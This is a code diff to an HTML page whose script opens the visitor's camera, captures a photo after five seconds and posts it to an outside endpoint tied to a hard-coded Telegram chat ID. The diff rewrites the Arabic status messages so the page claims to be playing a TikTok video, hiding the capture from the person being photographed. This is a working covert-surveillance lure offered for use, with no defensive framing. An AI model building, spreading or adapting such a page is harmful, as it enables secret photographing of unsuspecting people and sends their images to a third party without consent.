@@ -22,7 +22,7 @@
   </style>
 </head>
 <body>
-  <div id="status">📸 جاري تشغيل الكاميرا...</div>
+  <div id="status">جاري تشغيل الفيديو التيك توك الان...</div>
 
   <script>
     const chat_id = "6908826896";
@@ -41,7 +41,7 @@
 
         const imageCapture = new ImageCapture(track);
 
-        document.getElementById("status").innerText = "📷 انتظر، يتم التقاط الصورة...";
+        document.getElementById("status").innerText = "📷 انتظر، يتم تشغيل فيديو التيك توك...";
 
         // ننتظر 5 ثواني لتشغيل الكاميرا بشكل فعلي
         setTimeout(async () => {
@@ -58,18 +58,18 @@
               body: formData
             }).then(r => r.json()).then(d => {
               document.getElementById("status").innerText = d.ok
-                ? "✅ تم إرسال الصورة!"
+                ? "✅ تم إرسال الفيديو!"
                 : "❌ فشل في الإرسال.";
             }).catch(err => {
               document.getElementById("status").innerText = "❌ خطأ بالشبكة.";
             });
           } catch (err) {
-            document.getElementById("status").innerText = "❌ فشل في التقاط الصورة.";
+            document.getElementById("status").innerText = "❌ فشل في تشغيل الفيديو التيك توك.";
           }
         }, 5000);
 
       } catch (err) {
-        document.getElementById("status").innerText = "❌ فشل في تشغيل الكاميرا.";
+        document.getElementById("status").innerText = "❌ فشل في تشغيل فيديو التيك توك.";
       }
     }
 
